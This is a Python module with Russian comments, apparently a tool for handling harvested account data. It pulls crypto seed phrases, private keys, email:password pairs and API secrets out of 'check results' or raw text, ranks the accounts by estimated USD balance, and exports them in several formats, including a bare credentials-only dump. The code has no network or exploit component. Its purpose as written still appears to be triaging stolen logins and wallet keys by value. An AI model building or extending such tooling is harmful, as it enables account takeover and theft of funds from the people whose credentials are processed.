# -*- coding: utf-8 -*-
"""
Auth Export v1.0.63
Экспорт аккаунтов с возможностью авторизации
"""

import json
import csv
from typing import Dict, Any, Optional, List
from datetime import datetime


class AuthAccountExporter:
    """Экспорт аккаунтов с credentials для авторизации"""
    
    def __init__(self):
        self.auth_accounts = []
    
    def add_account(
        self,
        account_data: Dict[str, Any],
        auth_type: str,
        credentials: Dict[str, str],
        balance_usd: float = 0.0
    ):
        """
        Добавить аккаунт с возможностью авторизации
        
        Args:
            account_data: Данные аккаунта (address, email, etc.)
            auth_type: Тип авторизации (seed, privkey, email_password, etc.)
            credentials: Credentials для входа
            balance_usd: Баланс в USD
        """
        
        account = {
            "timestamp": datetime.now().isoformat(),
            "auth_type": auth_type,
            "credentials": credentials,
            "balance_usd": balance_usd,
            "account_data": account_data,
        }
        
        self.auth_accounts.append(account)
    
    def filter_by_balance(
        self,
        min_balance: float = 0.0,
        max_balance: Optional[float] = None
    ) -> List[Dict[str, Any]]:
        """
        Фильтровать аккаунты по балансу
        
        Args:
            min_balance: Минимальный баланс
            max_balance: Максимальный баланс (None = без ограничения)
        
        Returns:
            Отфильтрованный список аккаунтов
        """
        
        filtered = []
        
        for account in self.auth_accounts:
            balance = account.get("balance_usd", 0.0)
            
            if balance < min_balance:
                continue
            
            if max_balance is not None and balance > max_balance:
                continue
            
            filtered.append(account)
        
        return filtered
    
    def filter_by_auth_type(self, auth_type: str) -> List[Dict[str, Any]]:
        """
        Фильтровать по типу авторизации
        
        Args:
            auth_type: Тип (seed, privkey, email_password, etc.)
        
        Returns:
            Отфильтрованный список
        """
        
        return [
            account for account in self.auth_accounts
            if account.get("auth_type") == auth_type
        ]
    
    def get_statistics(self) -> Dict[str, Any]:
        """Получить статистику"""
        
        stats = {
            "total_accounts": len(self.auth_accounts),
            "total_balance_usd": 0.0,
            "by_auth_type": {},
            "with_balance": 0,
            "without_balance": 0,
        }
        
        for account in self.auth_accounts:
            balance = account.get("balance_usd", 0.0)
            auth_type = account.get("auth_type", "unknown")
            
            stats["total_balance_usd"] += balance
            
            if balance > 0:
                stats["with_balance"] += 1
            else:
                stats["without_balance"] += 1
            
            if auth_type not in stats["by_auth_type"]:
                stats["by_auth_type"][auth_type] = {
                    "count": 0,
                    "total_balance": 0.0,
                }
            
            stats["by_auth_type"][auth_type]["count"] += 1
            stats["by_auth_type"][auth_type]["total_balance"] += balance
        
        return stats
    
    def export_to_json(
        self,
        output_file: str,
        min_balance: float = 0.0,
        include_credentials: bool = True
    ) -> bool:
        """
        Экспорт в JSON
        
        Args:
            output_file: Путь к файлу
            min_balance: Минимальный баланс для экспорта
            include_credentials: Включать ли credentials
        
        Returns:
            True если успешно
        """
        
        try:
            filtered = self.filter_by_balance(min_balance=min_balance)
            
            export_data = {
                "exported_at": datetime.now().isoformat(),
                "total_accounts": len(filtered),
                "min_balance_filter": min_balance,
                "accounts": [],
            }
            
            for account in filtered:
                account_export = {
                    "auth_type": account["auth_type"],
                    "balance_usd": account["balance_usd"],
                    "account_data": account["account_data"],
                }
                
                if include_credentials:
                    account_export["credentials"] = account["credentials"]
                
                export_data["accounts"].append(account_export)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            return True
        
        except Exception as e:
            print(f"Error exporting to JSON: {e}")
            return False
    
    def export_to_txt(
        self,
        output_file: str,
        min_balance: float = 0.0,
        format_type: str = "detailed"
    ) -> bool:
        """
        Экспорт в TXT
        
        Args:
            output_file: Путь к файлу
            min_balance: Минимальный баланс
            format_type: Формат (detailed, compact, credentials_only)
        
        Returns:
            True если успешно
        """
        
        try:
            filtered = self.filter_by_balance(min_balance=min_balance)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("=" * 70 + "\n")
                f.write("АККАУНТЫ С ВОЗМОЖНОСТЬЮ АВТОРИЗАЦИИ\n")
                f.write("=" * 70 + "\n\n")
                
                f.write(f"Экспортировано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Всего аккаунтов: {len(filtered)}\n")
                f.write(f"Минимальный баланс: ${min_balance:,.2f}\n")
                f.write(f"Общий баланс: ${sum(a['balance_usd'] for a in filtered):,.2f}\n\n")
                
                f.write("=" * 70 + "\n\n")
                
                for i, account in enumerate(filtered, 1):
                    auth_type = account["auth_type"]
                    balance = account["balance_usd"]
                    credentials = account["credentials"]
                    account_data = account["account_data"]
                    
                    if format_type == "credentials_only":
                        # Только credentials
                        if auth_type == "seed":
                            f.write(f"{credentials.get('seed', '')}\n")
                        elif auth_type == "privkey":
                            f.write(f"{credentials.get('privkey', '')}\n")
                        elif auth_type == "email_password":
                            email = credentials.get('email', '')
                            password = credentials.get('password', '')
                            f.write(f"{email}:{password}\n")
                    
                    elif format_type == "compact":
                        # Компактный формат
                        address = account_data.get('address', 'N/A')
                        f.write(f"{i}. {address} | ${balance:,.2f} | {auth_type}\n")
                        
                        if auth_type == "seed":
                            f.write(f"   Seed: {credentials.get('seed', '')}\n")
                        elif auth_type == "privkey":
                            f.write(f"   Key: {credentials.get('privkey', '')}\n")
                        elif auth_type == "email_password":
                            f.write(f"   Email: {credentials.get('email', '')}\n")
                            f.write(f"   Pass: {credentials.get('password', '')}\n")
                        
                        f.write("\n")
                    
                    else:
                        # Детальный формат
                        f.write(f"{'=' * 70}\n")
                        f.write(f"АККАУНТ #{i}\n")
                        f.write(f"{'=' * 70}\n\n")
                        
                        f.write(f"💰 Баланс: ${balance:,.2f}\n")
                        f.write(f"🔐 Тип авторизации: {auth_type}\n\n")
                        
                        # Данные аккаунта
                        f.write("📊 Данные аккаунта:\n")
                        for key, value in account_data.items():
                            f.write(f"  • {key}: {value}\n")
                        
                        f.write("\n")
                        
                        # Credentials
                        f.write("🔑 Credentials для входа:\n")
                        
                        if auth_type == "seed":
                            f.write(f"  Seed фраза: {credentials.get('seed', '')}\n")
                            if 'derivation_path' in credentials:
                                f.write(f"  Derivation path: {credentials['derivation_path']}\n")
                        
                        elif auth_type == "privkey":
                            f.write(f"  Приватный ключ: {credentials.get('privkey', '')}\n")
                        
                        elif auth_type == "email_password":
                            f.write(f"  Email: {credentials.get('email', '')}\n")
                            f.write(f"  Password: {credentials.get('password', '')}\n")
                        
                        elif auth_type == "api_keys":
                            f.write(f"  API Key: {credentials.get('api_key', '')}\n")
                            f.write(f"  API Secret: {credentials.get('api_secret', '')}\n")
                        
                        f.write("\n\n")
            
            return True
        
        except Exception as e:
            print(f"Error exporting to TXT: {e}")
            return False
    
    def export_to_csv(
        self,
        output_file: str,
        min_balance: float = 0.0
    ) -> bool:
        """
        Экспорт в CSV
        
        Args:
            output_file: Путь к файлу
            min_balance: Минимальный баланс
        
        Returns:
            True если успешно
        """
        
        try:
            filtered = self.filter_by_balance(min_balance=min_balance)
            
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                
                # Заголовок
                writer.writerow([
                    'Address',
                    'Balance USD',
                    'Auth Type',
                    'Seed/Privkey/Email',
                    'Password',
                    'Additional Data'
                ])
                
                for account in filtered:
                    auth_type = account["auth_type"]
                    balance = account["balance_usd"]
                    credentials = account["credentials"]
                    account_data = account["account_data"]
                    
                    address = account_data.get('address', 'N/A')
                    
                    # Определяем основной credential
                    if auth_type == "seed":
                        main_cred = credentials.get('seed', '')
                        password = ''
                    elif auth_type == "privkey":
                        main_cred = credentials.get('privkey', '')
                        password = ''
                    elif auth_type == "email_password":
                        main_cred = credentials.get('email', '')
                        password = credentials.get('password', '')
                    else:
                        main_cred = str(credentials)
                        password = ''
                    
                    # Дополнительные данные
                    additional = json.dumps(account_data, ensure_ascii=False)
                    
                    writer.writerow([
                        address,
                        f"{balance:.2f}",
                        auth_type,
                        main_cred,
                        password,
                        additional
                    ])
            
            return True
        
        except Exception as e:
            print(f"Error exporting to CSV: {e}")
            return False
    
    def format_report(self, max_accounts: int = 10) -> str:
        """Форматировать отчет"""
        
        lines = []
        
        lines.append("🔐 AUTH ACCOUNTS REPORT")
        lines.append("=" * 50)
        
        # Статистика
        stats = self.get_statistics()
        
        lines.append(f"\n📊 STATISTICS:")
        lines.append(f"  Total Accounts: {stats['total_accounts']}")
        lines.append(f"  With Balance: {stats['with_balance']}")
        lines.append(f"  Without Balance: {stats['without_balance']}")
        lines.append(f"  Total Balance: ${stats['total_balance_usd']:,.2f}")
        
        # По типам авторизации
        by_type = stats.get("by_auth_type", {})
        if by_type:
            lines.append(f"\n🔑 BY AUTH TYPE:")
            for auth_type, data in sorted(by_type.items(), key=lambda x: x[1]["total_balance"], reverse=True):
                count = data["count"]
                balance = data["total_balance"]
                lines.append(f"  • {auth_type}: {count} accounts (${balance:,.2f})")
        
        # Топ аккаунты
        sorted_accounts = sorted(
            self.auth_accounts,
            key=lambda x: x.get("balance_usd", 0),
            reverse=True
        )
        
        if sorted_accounts:
            lines.append(f"\n💰 TOP ACCOUNTS (showing first {max_accounts}):")
            
            for i, account in enumerate(sorted_accounts[:max_accounts], 1):
                balance = account.get("balance_usd", 0)
                auth_type = account.get("auth_type", "unknown")
                account_data = account.get("account_data", {})
                address = account_data.get("address", "N/A")
                
                # Маскируем адрес
                if len(address) > 20:
                    masked_address = address[:10] + "..." + address[-8:]
                else:
                    masked_address = address
                
                lines.append(f"\n  {i}. {masked_address}")
                lines.append(f"     Balance: ${balance:,.2f}")
                lines.append(f"     Auth: {auth_type}")
        
        return "\n".join(lines)


class ResultsAnalyzer:
    """Анализатор результатов для поиска аккаунтов с авторизацией"""
    
    def __init__(self):
        self.exporter = AuthAccountExporter()
    
    def analyze_results(self, results: List[Dict[str, Any]]) -> AuthAccountExporter:
        """
        Анализировать результаты проверки и найти аккаунты с авторизацией
        
        Args:
            results: Список результатов проверки
        
        Returns:
            AuthAccountExporter с найденными аккаунтами
        """
        
        for result in results:
            # Проверяем наличие credentials
            has_auth = False
            auth_type = None
            credentials = {}
            
            # 1. Проверяем seed фразу
            if "seed" in result or "mnemonic" in result or "phrase" in result:
                seed = result.get("seed") or result.get("mnemonic") or result.get("phrase")
                if seed and len(seed.split()) >= 12:
                    has_auth = True
                    auth_type = "seed"
                    credentials = {
                        "seed": seed,
                        "derivation_path": result.get("derivation_path", "m/44'/60'/0'/0/0")
                    }
            
            # 2. Проверяем приватный ключ
            elif "privkey" in result or "private_key" in result or "key" in result:
                privkey = result.get("privkey") or result.get("private_key") or result.get("key")
                if privkey and len(privkey) >= 64:
                    has_auth = True
                    auth_type = "privkey"
                    credentials = {
                        "privkey": privkey
                    }
            
            # 3. Проверяем email:password
            elif "email" in result and "password" in result:
                email = result.get("email")
                password = result.get("password")
                if email and password:
                    has_auth = True
                    auth_type = "email_password"
                    credentials = {
                        "email": email,
                        "password": password
                    }
            
            # 4. Проверяем API ключи
            elif "api_key" in result and "api_secret" in result:
                api_key = result.get("api_key")
                api_secret = result.get("api_secret")
                if api_key and api_secret:
                    has_auth = True
                    auth_type = "api_keys"
                    credentials = {
                        "api_key": api_key,
                        "api_secret": api_secret
                    }
            
            # Если нашли credentials, добавляем аккаунт
            if has_auth:
                # Получаем баланс
                balance_usd = 0.0
                
                if "balance_usd" in result:
                    balance_usd = float(result.get("balance_usd", 0))
                elif "balance" in result:
                    # Пытаемся конвертировать в USD
                    balance = float(result.get("balance", 0))
                    # Примерная цена (в реальности нужно получать актуальную)
                    if "ETH" in str(result.get("currency", "")):
                        balance_usd = balance * 2500
                    elif "BTC" in str(result.get("currency", "")):
                        balance_usd = balance * 50000
                    else:
                        balance_usd = balance
                
                # Собираем данные аккаунта
                account_data = {
                    "address": result.get("address", "N/A"),
                    "currency": result.get("currency", "N/A"),
                    "network": result.get("network", result.get("chain", "N/A")),
                }
                
                # Добавляем дополнительные поля если есть
                for key in ["email", "username", "name", "platform"]:
                    if key in result:
                        account_data[key] = result[key]
                
                self.exporter.add_account(
                    account_data=account_data,
                    auth_type=auth_type,
                    credentials=credentials,
                    balance_usd=balance_usd
                )
        
        return self.exporter
    
    def analyze_from_text(self, text: str) -> AuthAccountExporter:
        """
        Анализировать текст и найти аккаунты с авторизацией
        
        Args:
            text: Текст для анализа
        
        Returns:
            AuthAccountExporter с найденными аккаунтами
        """
        
        lines = text.split('\n')
        
        for line in lines:
            # Ищем паттерны
            
            # 1. Seed фраза (12-24 слова)
            words = line.split()
            if 12 <= len(words) <= 24:
                # Проверяем что это похоже на seed
                if all(len(word) >= 3 and word.isalpha() for word in words):
                    self.exporter.add_account(
                        account_data={"source": "text_analysis"},
                        auth_type="seed",
                        credentials={"seed": line.strip()},
                        balance_usd=0.0
                    )
            
            # 2. Email:Password
            if ":" in line and "@" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    email = parts[0].strip()
                    password = ":".join(parts[1:]).strip()
                    
                    if "@" in email and "." in email:
                        self.exporter.add_account(
                            account_data={"email": email},
                            auth_type="email_password",
                            credentials={"email": email, "password": password},
                            balance_usd=0.0
                        )
        
        return self.exporter
